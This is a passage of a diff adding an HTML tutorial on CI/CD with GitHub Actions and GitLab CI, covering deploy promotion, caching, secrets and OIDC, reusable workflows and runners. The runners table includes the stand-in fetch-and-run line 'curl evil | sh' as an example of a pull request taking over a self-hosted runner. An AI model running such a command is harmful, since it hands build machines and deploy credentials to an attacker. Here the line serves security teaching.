+        <span class="kw">with</span>: { <span class="kw">image-ref</span>: <span class="str">${{ env.IMAGE }}@${{ steps.push.outputs.digest }}</span>, <span class="kw">severity</span>: <span class="str">CRITICAL,HIGH</span>, <span class="kw">exit-code</span>: <span class="str">'1'</span>, <span class="kw">ignore-unfixed</span>: <span class="kw">true</span> }
+      - <span class="kw">name</span>: Sign image (keyless, OIDC)
+        <span class="kw">uses</span>: sigstore/cosign-installer@v3
+      - <span class="kw">run</span>: cosign sign --yes <span class="str">"${IMAGE}@${{ steps.push.outputs.digest }}"</span>
+
+  <span class="kw">deploy-staging</span>:
+    <span class="kw">needs</span>: image
+    <span class="kw">if</span>: <span class="str">github.ref == 'refs/heads/main'</span>
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">environment</span>: { <span class="kw">name</span>: staging, <span class="kw">url</span>: <span class="str">https://staging.shop.example</span> }
+    <span class="kw">permissions</span>: { <span class="kw">id-token</span>: write, <span class="kw">contents</span>: read }
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: aws-actions/configure-aws-credentials@v4     <span class="cmt"># OIDC: no stored AWS keys (Section 5)</span>
+        <span class="kw">with</span>: { <span class="kw">role-to-assume</span>: <span class="str">arn:aws:iam::123456789012:role/gha-shop-deploy</span>, <span class="kw">aws-region</span>: ap-south-1 }
+      - <span class="kw">run</span>: aws eks update-kubeconfig --name shop-staging
+      - <span class="kw">run</span>: |
+          kubectl set image deploy/api api=<span class="str">"${IMAGE}@${{ needs.image.outputs.digest }}"</span> -n shop
+          kubectl rollout status deploy/api -n shop --timeout=180s
+
+  <span class="kw">deploy-prod</span>:
+    <span class="kw">needs</span>: [image, deploy-staging]
+    <span class="kw">if</span>: <span class="str">startsWith(github.ref, 'refs/tags/v')</span>
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">environment</span>: production                          <span class="cmt"># required reviewers + wait timer configured in repo settings</span>
+    <span class="kw">concurrency</span>: { <span class="kw">group</span>: prod-deploy, <span class="kw">cancel-in-progress</span>: <span class="kw">false</span> }   <span class="cmt"># never cancel a prod deploy; queue instead</span>
+    <span class="kw">steps</span>:
+      - <span class="kw">run</span>: echo <span class="str">"deploy ${{ needs.image.outputs.digest }} to prod"</span>   <span class="cmt"># or: bump the tag in the GitOps repo and let Argo CD roll it out</span></pre>
+<table>
+  <thead><tr><th>Design choice in this pipeline</th><th>Why</th></tr></thead>
+  <tbody>
+    <tr><td>Build once, promote the same digest</td><td>Staging and prod run byte-identical images. Tags can move; a digest cannot.</td></tr>
+    <tr><td>PRs stop after <code>test</code></td><td>No images or deploys from untrusted or unfinished code; saves minutes.</td></tr>
+    <tr><td>Image only from <code>push</code>; prod only from tags</td><td>Clear, auditable promotion rule; tags are release decisions.</td></tr>
+    <tr><td>Scan + sign before deploy</td><td>Supply-chain hygiene; admission controllers can require signatures.</td></tr>
+    <tr><td><code>environment:</code> on deploy jobs</td><td>Approval gates, deployment history, environment-scoped secrets.</td></tr>
+    <tr><td>OIDC to the cloud</td><td>No long-lived cloud keys stored in GitHub.</td></tr>
+    <tr><td>GitOps alternative</td><td>Instead of <code>kubectl</code> from CI, commit the new digest to a config repo; Argo CD / Flux apply it. CI then needs no cluster credentials at all.</td></tr>
+  </tbody>
+</table>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>Rebuild per environment</td><td>Staging builds its jar; prod builds another from the same commit "to be safe".</td><td>One artifact, promoted. Two builds are never guaranteed identical.</td></tr>
+    <tr><td>Deploy <code>:latest</code></td><td><code>kubectl set image api=ghcr.io/shop/api:latest</code> — what version is running? Nobody knows.</td><td>Deploy by digest (or an immutable version tag).</td></tr>
+    <tr><td>Cluster admin kubeconfig as a secret</td><td>A long-lived kubeconfig with full rights stored in repo secrets.</td><td>OIDC → short-lived cloud role scoped to one namespace; or GitOps so CI never touches the cluster.</td></tr>
+    <tr><td>Cancelling deploys</td><td><code>cancel-in-progress: true</code> on the prod job → a half-finished rollout.</td><td>Cancel CI runs; queue deploys.</td></tr>
+    <tr><td>Tests only on main</td><td>PRs skip integration tests "for speed", main goes red after merge.</td><td>Full <code>verify</code> on PRs; Testcontainers works on hosted runners (Docker is present).</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. Why download the jar artifact in the <code>image</code> job instead of just re-running <code>mvn package</code>?</div>
+  <details><summary>Reveal hint</summary><div class="hint">Two reasons: speed (no second compile), and <b>provenance</b> — the image contains exactly the bytes the tests ran against. A second build might pull a newer snapshot or a different plugin version and silently differ.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 4 ============================= -->
+<h2 id="s4">4. Caching, artifacts, matrix builds</h2>
+<table>
+  <thead><tr><th>Mechanism</th><th>What it is for</th><th>Lifetime / limits</th></tr></thead>
+  <tbody>
+    <tr><td><b>Cache</b> (<code>actions/cache</code>, or <code>cache:</code> in setup-java/setup-node)</td><td>Speed: dependency stores (<code>~/.m2</code>, <code>~/.gradle</code>), Docker layers. Keyed by a hash; <b>best effort</b> — a miss must not break the build.</td><td>10 GB per repo, evicted after 7 days unused; branch-scoped (PR can read main's cache, not vice versa).</td></tr>
+    <tr><td><b>Artifact</b> (<code>upload-artifact</code> / <code>download-artifact</code>)</td><td>Pass files between jobs; keep build outputs and reports for humans to download.</td><td>Per run; default 90 days (set <code>retention-days</code>). Zipped; v4 artifacts are immutable per name.</td></tr>
+    <tr><td><b>Packages / Releases</b></td><td>Publish jars (GitHub Packages Maven), images (ghcr.io), release binaries.</td><td>Permanent.</td></tr>
+  </tbody>
+</table>
+<pre><span class="cmt"># explicit cache (when setup-java's built-in isn't enough, e.g. custom repo dir)</span>
+- <span class="kw">uses</span>: actions/cache@v4
+  <span class="kw">with</span>:
+    <span class="kw">path</span>: ~/.m2/repository
+    <span class="kw">key</span>: <span class="str">maven-${{ runner.os }}-${{ hashFiles('**/pom.xml') }}</span>     <span class="cmt"># exact hit when no POM changed</span>
+    <span class="kw">restore-keys</span>: |
+      maven-${{ runner.os }}-                                      <span class="cmt"># partial hit: most jars still reused</span>
+<span class="cmt"># Gradle: just use gradle/actions/setup-gradle@v4 — caches, read-only on PRs, cleans stale entries</span>
+
+<span class="cmt"># matrix: run the same job across versions / OSes</span>
+<span class="kw">jobs</span>:
+  <span class="kw">test</span>:
+    <span class="kw">strategy</span>:
+      <span class="kw">fail-fast</span>: <span class="kw">false</span>                        <span class="cmt"># let all combos finish so you see every failure</span>
+      <span class="kw">max-parallel</span>: <span class="num">4</span>
+      <span class="kw">matrix</span>:
+        <span class="kw">java</span>: [<span class="num">17</span>, <span class="num">21</span>]
+        <span class="kw">os</span>: [ubuntu-latest, windows-latest]
+        <span class="kw">include</span>:
+          - { <span class="kw">java</span>: <span class="num">23</span>, <span class="kw">os</span>: ubuntu-latest, <span class="kw">experimental</span>: <span class="kw">true</span> }
+        <span class="kw">exclude</span>:
+          - { <span class="kw">java</span>: <span class="num">17</span>, <span class="kw">os</span>: windows-latest }
+    <span class="kw">runs-on</span>: <span class="str">${{ matrix.os }}</span>
+    <span class="kw">continue-on-error</span>: <span class="str">${{ matrix.experimental == true }}</span>
+    <span class="kw">name</span>: <span class="str">test (java ${{ matrix.java }}, ${{ matrix.os }})</span>
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/checkout@v4
+      - <span class="kw">uses</span>: actions/setup-java@v4
+        <span class="kw">with</span>: { <span class="kw">distribution</span>: temurin, <span class="kw">java-version</span>: <span class="str">${{ matrix.java }}</span>, <span class="kw">cache</span>: maven }
+      - <span class="kw">run</span>: ./mvnw -B -ntp verify
+
+<span class="cmt"># dynamic matrix from a previous job (e.g. changed services in a monorepo)</span>
+  <span class="kw">detect</span>:
+    <span class="kw">outputs</span>: { <span class="kw">services</span>: <span class="str">${{ steps.set.outputs.services }}</span> }
+    <span class="kw">steps</span>:
+      - <span class="kw">id</span>: set
+        <span class="kw">run</span>: echo <span class="str">'services=["orders","payments"]'</span> &gt;&gt; <span class="str">"$GITHUB_OUTPUT"</span>
+  <span class="kw">build</span>:
+    <span class="kw">needs</span>: detect
+    <span class="kw">strategy</span>: { <span class="kw">matrix</span>: { <span class="kw">service</span>: <span class="str">${{ fromJSON(needs.detect.outputs.services) }}</span> } }
+    <span class="kw">steps</span>: [ { <span class="kw">run</span>: <span class="str">./mvnw -pl services/${{ matrix.service }} -am verify</span> } ]</pre>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>Cache as storage</td><td>Caching <code>target/</code> and expecting the jar in the next job.</td><td>Artifacts for outputs; cache only for re-downloadable things.</td></tr>
+    <tr><td>Cache key too stable</td><td><code>key: maven-cache</code> — never refreshed; grows stale forever.</td><td>Hash the lockfiles / POMs in the key; <code>restore-keys</code> for fallback.</td></tr>
+    <tr><td>Cache key too unstable</td><td><code>key: ${{ github.sha }}</code> — a miss on every commit.</td><td>Key on dependency declarations, not on the commit.</td></tr>
+    <tr><td>Own snapshots in cache</td><td>Stale <code>com/shop/*-SNAPSHOT</code> jars reused from cache instead of the fresh build.</td><td>Exclude your group from the cached path, or <code>mvn -U</code>.</td></tr>
+    <tr><td>Huge matrix on every PR</td><td>3 OS × 4 JDKs × 2 DBs = 24 jobs per push.</td><td>Small matrix on PRs (one OS, LTS JDK); full matrix nightly.</td></tr>
+    <tr><td>Artifacts forever</td><td>Default 90-day retention on 200 MB artifacts ×1,000 runs → storage bill.</td><td><code>retention-days: 7</code> for CI outputs; publish real releases to Packages/Releases.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. The PR's cache restore says "Cache not found" even though main just saved one with the same key. Why?</div>
+  <details><summary>Reveal hint</summary><div class="hint">Cache scope: a PR branch can read caches from its base branch (<code>main</code>) and itself, but <code>main</code> cannot read PR caches, and PR branches cannot read each other. Also the key includes <code>runner.os</code> — a Windows job never hits an Ubuntu cache. Check the exact key in the logs.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 5 ============================= -->
+<h2 id="s5">5. Secrets, variables, environments, OIDC</h2>
+<table>
+  <thead><tr><th>Kind</th><th>Where set</th><th>Access</th><th>Use</th></tr></thead>
+  <tbody>
+    <tr><td><b>Repository secret</b></td><td>Settings → Secrets → Actions</td><td><code>${{ secrets.NAME }}</code>; masked in logs</td><td>Tokens the whole repo's workflows need.</td></tr>
+    <tr><td><b>Environment secret</b></td><td>Settings → Environments → <i>production</i></td><td>Only jobs with <code>environment: production</code></td><td>Prod credentials, scoped behind approvals.</td></tr>
+    <tr><td><b>Organization secret</b></td><td>Org settings; limited to selected repos</td><td>Same syntax</td><td>Shared registry / Sonar tokens.</td></tr>
+    <tr><td><b>Variable</b> (<code>vars</code>)</td><td>Same places, non-secret</td><td><code>${{ vars.NAME }}</code>, not masked</td><td>Region names, feature toggles, image names.</td></tr>
+    <tr><td><b><code>GITHUB_TOKEN</code></b></td><td>Automatic per job</td><td><code>${{ secrets.GITHUB_TOKEN }}</code> / <code>${{ github.token }}</code></td><td>Push packages, comment on PRs, create releases — scoped by <code>permissions:</code>. Expires when the job ends.</td></tr>
+    <tr><td><b>OIDC token</b></td><td>Requested at runtime (<code>id-token: write</code>)</td><td>Exchanged with AWS/GCP/Azure/Vault for short-lived credentials</td><td>Cloud deploys without stored keys.</td></tr>
+  </tbody>
+</table>
+<pre><span class="cmt"># environments: gates and history (Settings → Environments → production)</span>
+<span class="cmt">#   Required reviewers: @shop/release-managers   ·   Wait timer: 5 min   ·   Deployment branches: tags matching v*</span>
+<span class="kw">jobs</span>:
+  <span class="kw">deploy</span>:
+    <span class="kw">environment</span>: { <span class="kw">name</span>: production, <span class="kw">url</span>: <span class="str">https://shop.example</span> }   <span class="cmt"># url shows on the deployment card</span>
+    <span class="kw">steps</span>:
+      - <span class="kw">run</span>: ./deploy.sh
+        <span class="kw">env</span>: { <span class="kw">API_KEY</span>: <span class="str">${{ secrets.PROD_API_KEY }}</span> }       <span class="cmt"># pass secrets through env, not on the command line</span>
+
+<span class="cmt"># OIDC → AWS (one-time setup: IAM Identity Provider for token.actions.githubusercontent.com + a role with a trust policy)</span>
+<span class="cmt"># trust policy condition:  "token.actions.githubusercontent.com:sub": "repo:shop/shop-api:environment:production"</span>
+<span class="kw">permissions</span>: { <span class="kw">id-token</span>: write, <span class="kw">contents</span>: read }
+<span class="kw">steps</span>:
+  - <span class="kw">uses</span>: aws-actions/configure-aws-credentials@v4
+    <span class="kw">with</span>: { <span class="kw">role-to-assume</span>: <span class="str">arn:aws:iam::123456789012:role/gha-shop-prod</span>, <span class="kw">aws-region</span>: ap-south-1 }
+  - <span class="kw">run</span>: aws s3 cp target/app.jar s3://shop-artifacts/
+<span class="cmt"># GCP: google-github-actions/auth with workload_identity_provider · Azure: azure/login with client-id/tenant-id (federated credential)</span>
+<span class="cmt"># Vault: hashicorp/vault-action with method: jwt</span>
+
+<span class="cmt"># masking a value you computed (not from secrets store)</span>
+- <span class="kw">run</span>: echo <span class="str">"::add-mask::$TOKEN"</span></pre>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>Long-lived cloud keys</td><td><code>AWS_ACCESS_KEY_ID</code> / <code>AWS_SECRET_ACCESS_KEY</code> as repo secrets, rotated never.</td><td>OIDC federation; role trust limited to repo + environment; credentials live 1 hour.</td></tr>
+    <tr><td>Secrets in <code>run</code> commands</td><td><code>run: curl -H "Authorization: ${{ secrets.TOKEN }}"</code> — interpolated into the script, may appear in error output/process list.</td><td><code>env: { TOKEN: ${{ secrets.TOKEN }} }</code> then <code>"$TOKEN"</code> in the shell.</td></tr>
+    <tr><td>Secrets available to PRs from forks</td><td>Expecting <code>secrets.X</code> in a fork PR → empty; or using <code>pull_request_target</code> to get them.</td><td>Fork PRs run without secrets by design. Steps needing secrets go in <code>push</code>-triggered jobs.</td></tr>
+    <tr><td>Masking by luck</td><td>Printing a secret base64-encoded or split → masking misses it.</td><td>Never echo secrets; <code>add-mask</code> derived values.</td></tr>
+    <tr><td>Prod env with no protection</td><td><code>environment: production</code> but no reviewers / branch rules.</td><td>Required reviewers, deployment-branch policy (tags only), environment-scoped secrets.</td></tr>
+    <tr><td>Structured secrets</td><td>Whole JSON/kubeconfig as one secret, then <code>jq</code> in logs.</td><td>Fine to store, but masking works on the whole string only — never print parts. Prefer OIDC where possible.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. How does OIDC let a workflow get AWS credentials without any secret stored anywhere?</div>
+  <details><summary>Reveal hint</summary><div class="hint">GitHub signs a short-lived JWT describing the run (repo, branch/tag, environment, actor). AWS trusts GitHub's public keys (the identity provider you registered) and, if the token's claims match the role's trust policy, STS hands back temporary credentials. Nothing to store, nothing to rotate, and the role can be limited to <code>repo:shop/api:environment:production</code>.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 6 ============================= -->
+<h2 id="s6">6. Reuse — composite actions, reusable workflows, starter templates</h2>
+<table>
+  <thead><tr><th>Mechanism</th><th>What it bundles</th><th>Called with</th><th>Use when</th></tr></thead>
+  <tbody>
+    <tr><td><b>Marketplace / third-party action</b></td><td>A step (JavaScript, Docker, or composite)</td><td><code>uses: owner/repo@v1</code></td><td>Setup tools, login to registries, upload reports.</td></tr>
+    <tr><td><b>Composite action</b> (<code>action.yml</code> in your repo or org)</td><td>Several steps as one step; has <code>inputs</code>/<code>outputs</code>; runs inside the caller's job</td><td><code>uses: ./.github/actions/setup-java-maven</code> or <code>uses: shop/actions/setup@v1</code></td><td>"Checkout + setup Java + cache" repeated in 20 workflows.</td></tr>
+    <tr><td><b>Reusable workflow</b> (<code>on: workflow_call</code>)</td><td>Whole jobs (with their own runners, matrix, environments, secrets)</td><td><code>jobs.x.uses: shop/workflows/.github/workflows/java-ci.yml@v2</code></td><td>Standard "build-test-image-deploy" shared by every service repo.</td></tr>
+    <tr><td><b>Starter workflow / template repo</b></td><td>A YAML file copied into new repos</td><td>"New workflow" UI</td><td>Bootstrapping; drifts over time — prefer reusable workflows for the shared part.</td></tr>
+    <tr><td><b>Required workflows / rulesets</b></td><td>Org-enforced workflow runs on every repo</td><td>Org settings</td><td>Security scans nobody can remove.</td></tr>
+  </tbody>
+</table>
+<pre><span class="cmt"># .github/actions/setup-java-maven/action.yml  (composite action)</span>
+<span class="kw">name</span>: Setup Java + Maven
+<span class="kw">inputs</span>:
+  <span class="kw">java-version</span>: { <span class="kw">default</span>: <span class="str">'21'</span> }
+<span class="kw">runs</span>:
+  <span class="kw">using</span>: composite
+  <span class="kw">steps</span>:
+    - <span class="kw">uses</span>: actions/setup-java@v4
+      <span class="kw">with</span>: { <span class="kw">distribution</span>: temurin, <span class="kw">java-version</span>: <span class="str">${{ inputs.java-version }}</span>, <span class="kw">cache</span>: maven }
+    - <span class="kw">run</span>: ./mvnw -v
+      <span class="kw">shell</span>: bash                                  <span class="cmt"># shell is REQUIRED in composite run steps</span>
+
+<span class="cmt"># .github/workflows/java-ci.yml in repo shop/workflows  (reusable workflow)</span>
+<span class="kw">on</span>:
+  <span class="kw">workflow_call</span>:
+    <span class="kw">inputs</span>:
+      <span class="kw">java-version</span>: { <span class="kw">type</span>: string, <span class="kw">default</span>: <span class="str">'21'</span> }
+      <span class="kw">push-image</span>:   { <span class="kw">type</span>: boolean, <span class="kw">default</span>: <span class="kw">false</span> }
+    <span class="kw">secrets</span>:
+      <span class="kw">SONAR_TOKEN</span>: { <span class="kw">required</span>: <span class="kw">false</span> }
+    <span class="kw">outputs</span>:
+      <span class="kw">image-digest</span>: { <span class="kw">value</span>: <span class="str">${{ jobs.image.outputs.digest }}</span> }
+<span class="kw">jobs</span>:
+  <span class="kw">test</span>:
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/checkout@v4
+      - <span class="kw">uses</span>: shop/workflows/.github/actions/setup-java-maven@v2
+        <span class="kw">with</span>: { <span class="kw">java-version</span>: <span class="str">${{ inputs.java-version }}</span> }
+      - <span class="kw">run</span>: ./mvnw -B -ntp verify
+  <span class="kw">image</span>:
+    <span class="kw">if</span>: <span class="str">${{ inputs.push-image }}</span>
+    <span class="kw">needs</span>: test
+    <span class="kw">outputs</span>: { <span class="kw">digest</span>: <span class="str">${{ steps.push.outputs.digest }}</span> }
+    <span class="kw">steps</span>: [ <span class="cmt"># … build-push-action …</span> ]
+
+<span class="cmt"># caller: .github/workflows/ci.yml in each service repo — 10 lines</span>
+<span class="kw">on</span>: { <span class="kw">push</span>: { <span class="kw">branches</span>: [main] }, <span class="kw">pull_request</span>: }
+<span class="kw">jobs</span>:
+  <span class="kw">ci</span>:
+    <span class="kw">uses</span>: shop/workflows/.github/workflows/java-ci.yml@v2    <span class="cmt"># pin to a tag; bump deliberately</span>
+    <span class="kw">with</span>: { <span class="kw">push-image</span>: <span class="str">${{ github.event_name == 'push' }}</span> }
+    <span class="kw">secrets</span>: inherit                                         <span class="cmt"># or list them explicitly</span>
+    <span class="kw">permissions</span>: { <span class="kw">contents</span>: read, <span class="kw">packages</span>: write, <span class="kw">id-token</span>: write }</pre>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>Copy-paste workflows</td><td>30 repos with 30 slightly different 200-line YAMLs; fixing the Trivy version = 30 PRs.</td><td>One reusable workflow, versioned by tag; repos call it. Dependabot bumps <code>@v2</code> → <code>@v3</code>.</td></tr>
+    <tr><td>Reusable workflow on <code>@main</code></td><td>A change in the shared repo breaks every service at once.</td><td>Tags (<code>v2</code>, <code>v2.3.1</code>); roll forward team by team.</td></tr>
+    <tr><td>Composite for whole pipelines</td><td>A composite action with 40 steps trying to do deploy gates.</td><td>Composite = step-level helper; reusable workflow = job-level pipeline (environments, matrix, runners).</td></tr>
+    <tr><td>Nesting too deep</td><td>Reusable → reusable → reusable → composite.</td><td>Max 4 levels allowed; keep it to 2. Debugging nested YAML is painful.</td></tr>
+    <tr><td>Secrets not passed</td><td>Reusable workflow fails with empty <code>secrets.X</code>.</td><td>Caller must pass <code>secrets: inherit</code> or each secret by name; declare them under <code>workflow_call.secrets</code>.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. In a reusable workflow, which repo does <code>actions/checkout</code> check out — the caller's or the shared workflow's?</div>
+  <details><summary>Reveal hint</summary><div class="hint">The <b>caller's</b>. Reusable workflows run in the caller's context (<code>github.repository</code>, token, secrets); only the YAML comes from the shared repo. Files from the shared repo (scripts) are <i>not</i> present — reference them via a composite action or check out the shared repo explicitly.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 7 ============================= -->
+<h2 id="s7">7. Runners — hosted, self-hosted, containers, services</h2>
+<table>
+  <thead><tr><th>Option</th><th>What you get</th><th>Trade-off</th></tr></thead>
+  <tbody>
+    <tr><td><b>GitHub-hosted</b> (<code>ubuntu-latest</code>, <code>-24.04</code>, <code>windows-latest</code>, <code>macos-latest</code>)</td><td>Fresh VM each job; Java, Maven, Gradle, Docker, Node, Python preinstalled (see runner-images repo); 4 vCPU / 16 GB (Linux). Larger runners available (paid).</td><td>Zero maintenance. Minutes cost on private repos; macOS ×10 multiplier; no access to your private network.</td></tr>
+    <tr><td><b>Self-hosted</b> (<code>runs-on: [self-hosted, linux, x64, gpu]</code>)</td><td>Your VMs/containers/K8s (Actions Runner Controller). Access to internal networks, custom hardware, no minute charges.</td><td>You patch, scale, and secure them. Must be <b>ephemeral</b> for public repos (a persistent runner can be poisoned by a PR).</td></tr>
+    <tr><td><b><code>container:</code></b> on a job</td><td>Run all steps inside a Docker image you choose (e.g. <code>maven:3.9-eclipse-temurin-21</code>).</td><td>Consistent toolchain; slower start; <code>actions/*</code> need Node inside the image (most official images are fine).</td></tr>
+    <tr><td><b><code>services:</code></b></td><td>Sidecar containers (Postgres, Redis, Kafka) networked to the job.</td><td>Alternative to Testcontainers when you want the DB up before the build starts.</td></tr>
+  </tbody>
+</table>
+<pre><span class="kw">jobs</span>:
+  <span class="kw">build</span>:
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">container</span>:
+      <span class="kw">image</span>: <span class="typ">maven:3.9-eclipse-temurin-21</span>
+      <span class="kw">options</span>: <span class="str">--user root</span>
+    <span class="kw">services</span>:
+      <span class="kw">redis</span>: { <span class="kw">image</span>: <span class="typ">redis:7-alpine</span>, <span class="kw">ports</span>: [<span class="str">"6379:6379"</span>] }
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/checkout@v4
+      - <span class="kw">run</span>: mvn -B verify
+        <span class="kw">env</span>: { <span class="kw">REDIS_HOST</span>: redis }                <span class="cmt"># inside a container job, services are reachable by name; without container: use localhost:port</span>
+
+<span class="cmt"># self-hosted on Kubernetes: Actions Runner Controller (ARC) — ephemeral pods per job</span>
+<span class="cmt">#   helm install arc oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller</span>
+<span class="cmt">#   helm install shop-runners oci://…/gha-runner-scale-set --set githubConfigUrl=https://github.com/shop --set minRunners=0 --set maxRunners=20</span>
+<span class="cmt">#   runs-on: shop-runners</span></pre>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>Persistent self-hosted runner for a public repo</td><td>A PR runs <code>curl evil | sh</code>; the runner is now owned and still has your deploy creds.</td><td>Ephemeral runners (ARC / <code>--ephemeral</code>); never self-hosted for public repos unless isolated.</td></tr>
+    <tr><td>Relying on preinstalled versions</td><td><code>mvn</code> from the image is 3.8 today, 3.9 tomorrow; Java default changes.</td><td>Wrapper + <code>setup-java</code> with an explicit version; <code>container:</code> image pinned by tag/digest.</td></tr>
+    <tr><td><code>ubuntu-latest</code> surprise</td><td>Ubuntu 22 → 24 migration breaks a native tool overnight.</td><td>Pin <code>ubuntu-24.04</code> for critical pipelines; subscribe to runner-images announcements.</td></tr>
+    <tr><td>Docker-in-Docker on self-hosted K8s</td><td>Mounting the node's Docker socket into runner pods.</td><td>Kaniko / BuildKit rootless for images; Testcontainers Cloud or a DinD sidecar with care.</td></tr>
+    <tr><td>Disk full on hosted runner</td><td>Big Docker builds hit the ~14 GB free limit.</td><td><code>docker system prune</code> step; remove unused preinstalled SDKs (<code>jlumbroso/free-disk-space</code>); larger runners.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. Testcontainers in a <code>container:</code> job fails with "Could not find a valid Docker environment". On a plain job it works. Why?</div>
+  <details><summary>Reveal hint</summary><div class="hint">Inside the job container there is no Docker socket. Either run Testcontainers on the plain runner (recommended — Docker is on the host), mount the socket (<code>options: -v /var/run/docker.sock:/var/run/docker.sock</code>) and set <code>TESTCONTAINERS_HOST_OVERRIDE</code>, or use <code>services:</code> for the databases instead.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 8 ============================= -->
+<h2 id="s8">8. GitLab CI — the same ideas, different YAML</h2>
+<pre><span class="cmt"># .gitlab-ci.yml — equivalent of the Section 3 pipeline</span>
+<span class="kw">stages</span>: [test, image, deploy]              <span class="cmt"># sequential stages; jobs in a stage run in parallel</span>
+
+<span class="kw">default</span>:
+  <span class="kw">image</span>: <span class="typ">maven:3.9-eclipse-temurin-21</span>        <span class="cmt"># every job runs in a container (Docker executor)</span>
+  <span class="kw">interruptible</span>: <span class="kw">true</span>                        <span class="cmt"># cancel when a newer pipeline starts on the same branch</span>
+  <span class="kw">cache</span>:
+    <span class="kw">key</span>: { <span class="kw">files</span>: [pom.xml] }                 <span class="cmt"># key by file hash</span>
+    <span class="kw">paths</span>: [.m2/repository]
+<span class="kw">variables</span>:
+  <span class="kw">MAVEN_OPTS</span>: <span class="str">-Dmaven.repo.local=$CI_PROJECT_DIR/.m2/repository</span>
+  <span class="kw">IMAGE</span>: <span class="str">$CI_REGISTRY_IMAGE</span>                    <span class="cmt"># built-in: registry.gitlab.com/shop/api</span>
+
+<span class="kw">workflow</span>:                                   <span class="cmt"># pipeline-level rules: when does a pipeline exist at all</span>
+  <span class="kw">rules</span>:
+    - <span class="kw">if</span>: <span class="str">$CI_PIPELINE_SOURCE == "merge_request_event"</span>
+    - <span class="kw">if</span>: <span class="str">$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</span>
+    - <span class="kw">if</span>: <span class="str">$CI_COMMIT_TAG</span>
+
+<span class="kw">test</span>:
+  <span class="kw">stage</span>: test
+  <span class="kw">services</span>: [{ <span class="kw">name</span>: <span class="typ">postgres:16</span>, <span class="kw">alias</span>: db }]
+  <span class="kw">variables</span>: { <span class="kw">POSTGRES_PASSWORD</span>: test, <span class="kw">DB_URL</span>: <span class="str">jdbc:postgresql://db:5432/postgres</span> }
+  <span class="kw">script</span>:
+    - ./mvnw -B -ntp verify
+  <span class="kw">artifacts</span>:
+    <span class="kw">when</span>: always
+    <span class="kw">paths</span>: [target/*.jar]
+    <span class="kw">expire_in</span>: 1 week
+    <span class="kw">reports</span>:
+      <span class="kw">junit</span>: target/*-reports/TEST-*.xml         <span class="cmt"># shows in the MR widget</span>
+      <span class="kw">coverage_report</span>: { <span class="kw">coverage_format</span>: jacoco, <span class="kw">path</span>: target/site/jacoco/jacoco.xml }
+  <span class="kw">coverage</span>: <span class="str">'/Total.*?([0-9]{1,3})%/'</span>
+
+<span class="kw">image</span>:
+  <span class="kw">stage</span>: image
+  <span class="kw">image</span>: { <span class="kw">name</span>: <span class="typ">gcr.io/kaniko-project/executor:debug</span>, <span class="kw">entrypoint</span>: [<span class="str">""</span>] }   <span class="cmt"># no Docker daemon needed</span>
+  <span class="kw">needs</span>: [test]                              <span class="cmt"># DAG: start as soon as test finishes, don't wait for the whole stage</span>
+  <span class="kw">rules</span>:
+    - <span class="kw">if</span>: <span class="str">$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH || $CI_COMMIT_TAG</span>
+  <span class="kw">script</span>:
+    - /kaniko/executor --context . --destination <span class="str">$IMAGE:$CI_COMMIT_SHORT_SHA</span> --destination <span class="str">$IMAGE:${CI_COMMIT_TAG:-main}</span>
+    <span class="cmt"># CI_REGISTRY_USER / CI_REGISTRY_PASSWORD / CI_JOB_TOKEN are injected automatically for the project registry</span>
+
+<span class="kw">.deploy</span>:                                    <span class="cmt"># hidden job (template) — reused with extends</span>
+  <span class="kw">stage</span>: deploy
+  <span class="kw">image</span>: <span class="typ">bitnami/kubectl:1.31</span>
+  <span class="kw">id_tokens</span>:
+    <span class="kw">AWS_TOKEN</span>: { <span class="kw">aud</span>: <span class="str">https://gitlab.com</span> }    <span class="cmt"># OIDC token for cloud federation</span>
+  <span class="kw">script</span>:
+    - kubectl set image deploy/api api=<span class="str">$IMAGE:$CI_COMMIT_SHORT_SHA</span> -n <span class="str">$NS</span>
+    - kubectl rollout status deploy/api -n <span class="str">$NS</span> --timeout=180s
+
+<span class="kw">deploy-staging</span>:
+  <span class="kw">extends</span>: .deploy
+  <span class="kw">variables</span>: { <span class="kw">NS</span>: shop-staging }
+  <span class="kw">environment</span>: { <span class="kw">name</span>: staging, <span class="kw">url</span>: <span class="str">https://staging.shop.example</span> }
+  <span class="kw">rules</span>: [{ <span class="kw">if</span>: <span class="str">$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</span> }]
+
+<span class="kw">deploy-prod</span>:
+  <span class="kw">extends</span>: .deploy
